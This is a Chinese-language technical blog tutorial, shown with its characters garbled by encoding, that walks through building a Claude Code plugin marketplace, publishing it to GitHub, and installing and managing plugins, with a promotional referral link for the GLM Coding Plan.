å¦‚æœæƒ³è¦è·å¾—æ€§ä»·æ¯”æœ€é«˜çš„ <code>Vibe Coding</code> ä½“éªŒ, æ¨èè´­ä¹° <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fclaude-code%3Fcc%3Dfission_glmcode_sub_v1%26ic%3DQ2N8XA4W77%26n%3Da****3" target="_blank" title="https://www.bigmodel.cn/claude-code?cc=fission_glmcode_sub_v1&amp;ic=Q2N8XA4W77&amp;n=a****3" ref="nofollow noopener noreferrer">ğŸ”— GLM Coding Lite</a> æœåŠ¡, <code>Lite</code> ç‰ˆæœ¬çš„æŒ‰ <code>Prompt</code> è®¡è´¹, æ¯ <code>5</code> å°æ—¶æœ€å¤šçº¦ <code>120</code> æ¬¡ <code>prompts</code></p>
</blockquote>
<h2 data-id="heading-0">Claude Code æ ¸å¿ƒåŠŸèƒ½</h2>
<p>æˆ‘ä»¬åœ¨ä½¿ç”¨ <code>Claude Code</code> æ—¶, å¯ä»¥é€šè¿‡ä»¥ä¸‹åŠŸèƒ½æ¥ <strong>é…ç½®æˆ–è€…æ‰©å±• <code>Claude Code</code> çš„èƒ½åŠ›</strong>, è¿™äº›èƒ½åŠ›éƒ½æ˜¯ <code>Claude Code</code> çš„æ ¸å¿ƒåŠŸèƒ½</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Commands</a>: è‡ªå®šä¹‰å‘½ä»¤</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fsub-agents" target="_blank" title="https://code.claude.com/docs/zh-CN/sub-agents" ref="nofollow noopener noreferrer">Agents</a>: å­ä»£ç†</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fhooks" target="_blank" title="https://code.claude.com/docs/zh-CN/hooks" ref="nofollow noopener noreferrer">Hooks</a>: åŸºäºäº‹ä»¶çš„è‡ªåŠ¨åŒ–å·¥ä½œæµ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fskills" target="_blank" title="https://code.claude.com/docs/zh-CN/skills" ref="nofollow noopener noreferrer">Skills</a>: æŠ€èƒ½</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fmcp" target="_blank" title="https://code.claude.com/docs/zh-CN/mcp" ref="nofollow noopener noreferrer">MCP</a>: MCP æœåŠ¡</li>
</ul>
<h2 data-id="heading-1">Plugin</h2>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fplugins" target="_blank" title="https://code.claude.com/docs/zh-CN/plugins" ref="nofollow noopener noreferrer">Claude Code æ’ä»¶</a> æ˜¯ä¸€ç§å°† <code>Claude Code</code> çš„ æ ¸å¿ƒåŠŸèƒ½(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Commands</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fsub-agents" target="_blank" title="https://code.claude.com/docs/zh-CN/sub-agents" ref="nofollow noopener noreferrer">Agents</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fhooks" target="_blank" title="https://code.claude.com/docs/zh-CN/hooks" ref="nofollow noopener noreferrer">Hooks</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fskills" target="_blank" title="https://code.claude.com/docs/zh-CN/skills" ref="nofollow noopener noreferrer">Skills</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fmcp" target="_blank" title="https://code.claude.com/docs/zh-CN/mcp" ref="nofollow noopener noreferrer">MCP</a>) æ‰“åŒ…å°è£…</strong> çš„ä¸€ç§æ–¹å¼, å®ƒå®ç°äº†å¯¹äºè¿™äº›æ ¸å¿ƒåŠŸèƒ½çš„ <strong>åˆ†ç¦»</strong> å’Œ <strong>å…±äº«</strong>, ä»»ä½•å®‰è£…äº†æ’ä»¶çš„é¡¹ç›®éƒ½å¯ä»¥ä½¿ç”¨æ’ä»¶å†…ç½®çš„ <code>Claude Code</code> æ ¸å¿ƒåŠŸèƒ½</p>
<h2 data-id="heading-2">ç”¨é€”</h2>
<ul>
<li>å°†è‡ªå·±åœ¨å·¥ä½œä¸­åˆ›å»ºçš„é€šç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Commands</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fsub-agents" target="_blank" title="https://code.claude.com/docs/zh-CN/sub-agents" ref="nofollow noopener noreferrer">Agents</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fhooks" target="_blank" title="https://code.claude.com/docs/zh-CN/hooks" ref="nofollow noopener noreferrer">Hooks</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fskills" target="_blank" title="https://code.claude.com/docs/zh-CN/skills" ref="nofollow noopener noreferrer">Skills</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fmcp" target="_blank" title="https://code.claude.com/docs/zh-CN/mcp" ref="nofollow noopener noreferrer">MCP</a> å°è£…æˆæ’ä»¶, <strong>åœ¨åˆ›å»ºæ–°é¡¹ç›®æ—¶å¯ä»¥ç›´æ¥é€šè¿‡å®‰è£…æ’ä»¶çš„æ–¹å¼æ¥ä½¿ç”¨è¿™äº›èƒ½åŠ›</strong></li>
<li>æƒ³è¦å°†è‡ªå·±åˆ›å»ºçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Commands</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fsub-agents" target="_blank" title="https://code.claude.com/docs/zh-CN/sub-agents" ref="nofollow noopener noreferrer">Agents</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fhooks" target="_blank" title="https://code.claude.com/docs/zh-CN/hooks" ref="nofollow noopener noreferrer">Hooks</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fskills" target="_blank" title="https://code.claude.com/docs/zh-CN/skills" ref="nofollow noopener noreferrer">Skills</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fmcp" target="_blank" title="https://code.claude.com/docs/zh-CN/mcp" ref="nofollow noopener noreferrer">MCP</a> <strong>åœ¨å›¢é˜Ÿå†…å…±äº«æˆ–ç›´æ¥å¼€æº</strong>, è®©åˆ«äººä¹Ÿå¯ä»¥ä½¿ç”¨è¿™äº›èƒ½åŠ›</li>
</ul>
<h2 data-id="heading-3">ç›®å½•ç»“æ„</h2>
<p>ä¸€ä¸ªæ’ä»¶çš„ç›®å½•ä¸­åŒ…å«äº†è¿™äº›æ ¸å¿ƒåŠŸèƒ½çš„æ–‡ä»¶, ç›®å½•ç»“æ„ä¸ <code>.claude</code> ä¸­çš„è·¯å¾„ç»“æ„ç›¸åŒ, ç»“æ„å¦‚ä¸‹:</p>
<pre><code class="hljs language-bash" lang="bash">my-first-plugin/
â”œâ”€â”€ .claude-plugin/
â”‚   â””â”€â”€ plugin.json          <span class="hljs-comment"># æ’ä»¶å…ƒæ•°æ®</span>
â”œâ”€â”€ commands/                 <span class="hljs-comment"># è‡ªå®šä¹‰æ–œæ å‘½ä»¤ï¼ˆå¯é€‰ï¼‰</span>
â”‚   â””â”€â”€ hello.md
â”œâ”€â”€ agents/                   <span class="hljs-comment"># è‡ªå®šä¹‰ä»£ç†ï¼ˆå¯é€‰ï¼‰</span>
â”‚   â””â”€â”€ helper.md
â”œâ”€â”€ skills/                   <span class="hljs-comment"># ä»£ç†æŠ€èƒ½ï¼ˆå¯é€‰ï¼‰</span>
â”‚   â””â”€â”€ my-skill/
â”‚       â””â”€â”€ SKILL.md
â””â”€â”€ hooks/                    <span class="hljs-comment"># äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆå¯é€‰ï¼‰</span>
    â””â”€â”€ hooks.json
</code></pre>
<h2 data-id="heading-4">åˆ›å»ºä¸€ä¸ªæ’ä»¶</h2>
<h3 data-id="heading-5">å‰ç½®æ¡ä»¶</h3>
<ol>
<li>å®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40anthropic-ai%2Fclaude-code" target="_blank" title="https://www.npmjs.com/package/@anthropic-ai/claude-code" ref="nofollow noopener noreferrer">@anthropic-ai/claude-code</a></li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npm install -g @anthropic-ai/claude-code <span class="hljs-comment"># æˆ–ä½¿ç”¨ pnpm å®‰è£…</span>
</code></pre>
<ol start="2">
<li>è´­ä¹° <code>Claude Code</code> æœåŠ¡(ä½¿ç”¨ <code>GLM Coding Plan</code> æœåŠ¡)</li>
</ol>
<blockquote>
<p>[!WARNING]
<strong>åœ¨å›½å†…æ— æ³•ç›´æ¥è´­ä¹°å’Œä½¿ç”¨ <code>Claude</code> ç³»åˆ—æ¨¡å‹</strong>, ç›®å‰å›½å†…å¯¹äº <code>Claude Code</code> <strong>æ”¯æŒåº¦æœ€å¥½çš„æ˜¯æ™ºè°±çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fclaude-code%3Fcc%3Dfission_glmcode_sub_v1%26ic%3DQ2N8XA4W77%26n%3Da****3" target="_blank" title="https://www.bigmodel.cn/claude-code?cc=fission_glmcode_sub_v1&amp;ic=Q2N8XA4W77&amp;n=a****3" ref="nofollow noopener noreferrer">ğŸ”— GLM Coding Plan</a> æœåŠ¡</strong>, æ€§ä»·æ¯”æœ€é«˜, å¯ä»¥ç›´æ¥ä½œä¸ºå¹³æ›¿ä½¿ç”¨</p>
</blockquote>
<p>è´­ä¹° <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fclaude-code%3Fcc%3Dfission_glmcode_sub_v1%26ic%3DQ2N8XA4W77%26n%3Da****3" target="_blank" title="https://www.bigmodel.cn/claude-code?cc=fission_glmcode_sub_v1&amp;ic=Q2N8XA4W77&amp;n=a****3" ref="nofollow noopener noreferrer">ğŸ”— GLM Coding Lite</a> æœåŠ¡, ç„¶åæ ¹æ® <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.bigmodel.cn%2Fcn%2Fcoding-plan%2Ftool%2Fclaude" target="_blank" title="https://docs.bigmodel.cn/cn/coding-plan/tool/claude" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a> è¿›è¡Œé…ç½®</p>
<h3 data-id="heading-6">æ’ä»¶å¸‚åœº</h3>
<p>æ’ä»¶å¸‚åœº(<code>Plugin Marketplace</code>) æŒ‡çš„æ˜¯åŒ…å«ä¸€ç³»åˆ—æ’ä»¶çš„ç”¨äºå…±äº«å’Œåˆ†å‘çš„é¡¹ç›®, æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŒ…å«æè¿°æ–‡ä»¶(<code>.claude-plugin/marketplace.json</code>)çš„é¡¹ç›®, æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¶å‘å¸ƒåˆ° <code>Github</code> æˆ–è€…ç§æœ‰ä»“åº“ä¸­è¿›è¡Œå…±äº«</p>
<h3 data-id="heading-7">åˆ›å»ºæ’ä»¶å¸‚åœº</h3>
<ol>
<li>åˆ›å»ºä¸€ä¸ªç©ºç›®å½•å¹¶è¿›è¡Œåˆå§‹åŒ–</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> ryan-plugin-marketplace
<span class="hljs-built_in">cd</span> ryan-plugin-marketplace &amp;&amp; pnpm init &amp;&amp; git init
</code></pre>
<ol start="2">
<li>åˆ›å»º <code>.claude-plugin/marketplace.json</code> æ–‡ä»¶, å¹¶å¡«å†™ä»¥ä¸‹å†…å®¹</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ryan-plugin-marketplace"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"owner"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Ryan"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"email"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ryan@example.com"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"dev"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./plugins/dev"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Functions used in daily development"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Ryan"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>åˆ›å»º <code>plugins/dev/commands/hello.md</code></li>
</ol>
<pre><code class="hljs language-md" lang="md">ä½ å¥½ğŸ‘‹
</code></pre>
<ol start="4">
<li>å°†é¡¹ç›®å‘å¸ƒåˆ° github</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23aa7d289545412fa16e9e01f92d54af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmx1dHRlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878035&amp;x-signature=TmDfJTkYFQGIXg35XP1XCy%2Fnm%2FQ%3D" alt="claude-code-plugin-github.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">git add -A &amp;&amp; git commit -m <span class="hljs-string">'init: Initialization project'</span>
git remote add origin git@github.com:SublimeCT/ryan-plugin-marketplace.git
git push -u origin main
</code></pre>
<h2 data-id="heading-8">å®‰è£…æ’ä»¶</h2>
<h3 data-id="heading-9">æ’ä»¶å¸‚åœºçš„å®‰è£…èŒƒå›´</h3>
<ul>
<li>å¯¹å½“å‰ç”¨æˆ·çš„æ‰€æœ‰é¡¹ç›®éƒ½ç”Ÿæ•ˆ:</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">claude

&gt; /plugin marketplace add anthropics/claude-code
</code></pre>
<ul>
<li>å¯¹æŸä¸ªé¡¹ç›®ç”Ÿæ•ˆ(ä¿®æ”¹ <code>.claude/settings.json</code>):</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"extraKnownMarketplaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"my-marketplace"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"repo"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"owner/repo"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>å¯¹æŸä¸ªé¡¹ç›®ç”Ÿæ•ˆ, ä½†ä¸æäº¤åˆ°ç‰ˆæœ¬æ§åˆ¶ä¸­(ä¿®æ”¹ <code>.claude/settings.local.json</code>):</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"extraKnownMarketplaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"my-marketplace"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"repo"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"owner/repo"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å¯¹å½“å‰ç”¨æˆ·çš„æ‰€æœ‰é¡¹ç›®éƒ½ç”Ÿæ•ˆçš„å®‰è£…æ–¹å¼:</p>
<pre><code class="hljs language-bash" lang="bash">claude

&gt; /plugin marketplace add xxx/ryan-plugin-marketplace
  â¿ Â Successfully added marketplace: ryan-plugin-marketplace
</code></pre>
<h3 data-id="heading-10">æ’ä»¶çš„å®‰è£…èŒƒå›´</h3>
<p>é»˜è®¤å®‰è£…çš„æ’ä»¶ä¼šåœ¨æ‰€æœ‰é¡¹ç›®ä¸­ç”Ÿæ•ˆ, ä½†æœ‰æ—¶æˆ‘ä»¬æƒ³è®©æ’ä»¶åªåœ¨æŸä¸ªé¡¹ç›®ä¸­ä½¿ç”¨, <code>Claude Code</code> æä¾›äº† <code>--scope</code> å‚æ•°æŒ‡å®šæ’ä»¶çš„å®‰è£…èŒƒå›´:</p>
<ul>
<li><code>User scope</code>(<strong>é»˜è®¤é€‰é¡¹</strong>): æ’ä»¶åœ¨å½“å‰ç”¨æˆ·ä¸‹çš„æ‰€æœ‰é¡¹ç›®éƒ½ç”Ÿæ•ˆ</li>
<li><code>Project scope</code>(<strong>åœ¨äº¤äº’å¼å‘½ä»¤è¡Œç•Œé¢ä¸­é»˜è®¤ä½¿ç”¨</strong>): æ’ä»¶åªåœ¨å½“å‰é¡¹ç›®ä¸‹ç”Ÿæ•ˆ, é…ç½®ä¿å­˜åœ¨ <code>.claude/settings.json</code>, ä¼šä¸å›¢é˜Ÿå…±äº«</li>
<li><code>Local scope</code>: ä»…å¯¹å½“å‰ä»“åº“ç”Ÿæ•ˆ, ä¸”ä¸ä¼šæäº¤åˆ°ç‰ˆæœ¬æ§åˆ¶</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹© <code>User scope</code>:</p>
<pre><code class="hljs language-bash" lang="bash">claude plugin install dev@ryan-plugin-marketplace
âœ” Successfully installed plugin: dev@ryan-plugin-marketplace
</code></pre>
<h3 data-id="heading-11">æµ‹è¯•</h3>
<p>æµ‹è¯•æ’ä»¶æ˜¯å¦å®‰è£…æˆåŠŸ:</p>
<pre><code class="hljs language-bash" lang="bash">claude

 â–â–›â–ˆâ–ˆâ–ˆâ–œâ–Œ   Claude Code v2.0.37
â–â–œâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–›â–˜  Sonnet 4.5 Â· API Usage Billing
  â–˜â–˜ â–â–    /Users/xxx/projects/openapi-codegen

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
&gt;Â /dev
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  /dev:base      base <span class="hljs-built_in">command</span> (plugin:dev@ryan-plugin-marketplace)
  /dev:hello     ä½ å¥½ğŸ‘‹ (plugin:dev@ryan-plugin-marketplace)
</code></pre>
<pre><code class="hljs language-bash" lang="bash">&gt; /dev:hello is runningâ€¦

âº ä½ å¥½ï¼æˆ‘å¯ä»¥å¸®åŠ©ä½ å¤„ç†è¿™ä¸ªé¡¹ç›®çš„ä»»åŠ¡ã€‚

  æˆ‘çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªåŸºäº OpenAPI/Swagger çš„ä»£ç ç”Ÿæˆå·¥å…·é¡¹ç›®ã€‚æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®ä½ çš„å—ï¼Ÿæ¯”å¦‚ï¼š

  - ä¿®å¤ bug
  - æ·»åŠ æ–°åŠŸèƒ½
  - ä»£ç é‡æ„
  - è¿è¡Œæµ‹è¯•
  - ä»£ç ç”Ÿæˆç›¸å…³çš„é—®é¢˜
  - æˆ–è€…å…¶ä»–ä»»ä½•å¼€å‘ä»»åŠ¡

  è¯·å‘Šè¯‰æˆ‘ä½ éœ€è¦ä»€ä¹ˆå¸®åŠ©ï¼
</code></pre>
<h2 data-id="heading-12">ç®¡ç†æ’ä»¶</h2>
<pre><code class="hljs language-bash" lang="bash">claude

&gt; /plugin
â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚ Plugins                                                                                                                                  â”‚
â”‚                                                                                                                                          â”‚
â”‚   1. Browse and install plugins                                                                                                          â”‚
â”‚ â¯ 2. Manage and uninstall plugins                                                                                                        â”‚
â”‚   3. Add marketplace                                                                                                                     â”‚
â”‚   4. Manage marketplaces                                                                                                                 â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
   Press â†‘â†“ to navigate Â· Enter to select Â· Esc to <span class="hljs-built_in">exit</span>

</code></pre>
<p>æˆ‘ä»¬é€‰æ‹© <code>Manage and uninstall plugins</code> å, å°±å¯ä»¥ <strong>å¯¹æ’ä»¶è¿›è¡Œ ç¦ç”¨ / æ›´æ–° / å¸è½½</strong> äº†:</p>
<pre><code class="hljs language-bash" lang="bash">&gt; /plugin
â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚ dev @ ryan-plugin-marketplace                                                                                                            â”‚
â”‚                                                                                                                                          â”‚
â”‚ Version: 1.0.0                                                                                                                           â”‚
â”‚                                                                                                                                          â”‚
â”‚ Functions used <span class="hljs-keyword">in</span> daily development                                                                                                      â”‚
â”‚                                                                                                                                          â”‚
â”‚ Author: Ryan                                                                                                                             â”‚
â”‚                                                                                                                                          â”‚
â”‚ Status: Enabled                                                                                                                          â”‚
â”‚                                                                                                                                          â”‚
â”‚ Installed components:                                                                                                                    â”‚
â”‚ â€¢ Commands: base, hello                                                                                                                  â”‚
â”‚                                                                                                                                          â”‚
â”‚                                                                                                                                          â”‚
â”‚ â¯ Disable plugin                                                                                                                         â”‚
â”‚   Mark <span class="hljs-keyword">for</span> update                                                                                                                        â”‚
â”‚   Update now                                                                                                                             â”‚
â”‚   Uninstall                                                                                                                              â”‚
â”‚   Back to plugin list                                                                                                                    â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯

 Navigate: â†‘â†“ â€¢ Select: Enter â€¢ Back: Esc

</code></pre>
<h2 data-id="heading-13">å‚è€ƒ</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Commands è‡ªå®šä¹‰å‘½ä»¤</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fsub-agents" target="_blank" title="https://code.claude.com/docs/zh-CN/sub-agents" ref="nofollow noopener noreferrer">Agents å­ä»£ç†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fhooks" target="_blank" title="https://code.claude.com/docs/zh-CN/hooks" ref="nofollow noopener noreferrer">Hooks åŸºäºäº‹ä»¶çš„è‡ªåŠ¨åŒ–å·¥ä½œæµ</a></li>
